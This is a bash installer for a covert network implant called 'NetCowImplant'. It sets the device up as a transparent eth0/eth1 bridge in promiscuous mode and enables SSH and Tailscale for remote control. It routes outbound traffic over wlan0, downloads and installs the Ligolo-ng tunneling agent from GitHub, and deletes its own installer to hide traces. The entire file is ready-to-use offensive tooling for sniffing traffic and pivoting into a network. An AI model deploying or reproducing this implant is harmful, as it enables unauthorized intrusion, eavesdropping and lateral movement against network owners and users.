#!/bin/bash

set -e

echo "[+] Deploying NetCowImplant..."

REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar openssh-server)
for pkg in "${REQUIRED_PKGS[@]}"; do
    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
        echo "    [o] $pkg missing, installing..."
        apt-get update && apt-get install -y "$pkg"
    else
        echo "    [✓] $pkg already installed"
    fi
done

echo
systemctl enable ssh
systemctl start ssh
echo "[✓] SSH is now active."

sed -i '/iface wlan0/,/^$/d' /etc/network/interfaces
sed -i '/auto wlan0/d' /etc/network/interfaces

cat << 'EOF' > /usr/local/sbin/setup_bridge.sh
#!/bin/bash

set -e

# Bring up physical interfaces
ip link set eth0 up
ip link set eth1 up

# Flush existing IPs
ip addr flush dev eth0
ip addr flush dev eth1

# Remove previous bridge if exists
ip link delete br0 type bridge 2>/dev/null || true

# Create and configure bridge
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1

ip link set br0 up
ip link set eth0 promisc on
ip link set eth1 promisc on
ip link set br0 promisc on

# Remove all default routes except wlan0
ip route | grep ^default | grep -v wlan0 | while read -r _ _ _ dev _; do
    ip route del default dev "$dev"
done

# Ensure br0 has metric 200
if ! grep -q "metric 200" /etc/network/interfaces; then
    sed -i '/iface br0 inet dhcp/a\    metric 200' /etc/network/interfaces
fi

# Launch DHCP on br0
dhclient -1 br0
EOF

chmod +x /usr/local/sbin/setup_bridge.sh
echo
echo "[✓] setup_bridge.sh created."

cat << 'EOF' > /etc/systemd/system/setup-bridge.service
[Unit]
Description=Setup bridge br0 at boot
After=network.target
Wants=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/setup_bridge.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

echo
echo "[✓] Systemd service setup-bridge.service created."

NM_CONF="/etc/NetworkManager/NetworkManager.conf"
if ! grep -q "\[keyfile\]" "$NM_CONF"; then
    echo -e "\n[keyfile]" >> "$NM_CONF"
fi
if grep -q "unmanaged-devices=" "$NM_CONF"; then
    sed -i '/unmanaged-devices=/c\unmanaged-devices=interface-name:eth0;interface-name:eth1' "$NM_CONF"
else
    echo "unmanaged-devices=interface-name:eth0;interface-name:eth1" >> "$NM_CONF"
fi

systemctl daemon-reexec
systemctl enable setup-bridge.service
systemctl enable tailscaled
systemctl start tailscaled
echo
echo "[✓] Tailscale ready to use."

echo
echo "[+] Downloading Ligolo-ng agent..."
mkdir -p /opt/ligolo
curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
tar -xvzf /opt/ligolo/ligolo-agent.tar.gz -C /opt/ligolo/
rm -f /opt/ligolo/LICENSE /opt/ligolo/README.md /opt/ligolo/ligolo-agent.tar.gz
chmod +x /opt/ligolo/agent
ln -sf /opt/ligolo/agent /usr/local/bin/ligolo
echo "[✓] Ligolo-ng agent ready to use as 'ligolo'"

echo
echo "[✓] NetCowImplant - Installation complete!"
echo
echo "[!] To finish setup:"
echo "    - Run: sudo tailscale up --authkey tskey-xxxxxxxxxxxxxxxx"
echo "    - Reboot: sudo reboot"
echo
echo "[📶] Help with Wi-Fi connection (if needed):"
echo "    - nmcli device wifi list"
echo "    - nmcli device wifi connect '<SSID>' password '<PASSWORD>'"
echo "    - nmcli connection modify '<SSID>' connection.autoconnect yes"
echo

INSTALLER_PATH=$(readlink -f "$0")
echo "[✓] Deleting installer script: $INSTALLER_PATH"
rm -f "$INSTALLER_PATH"
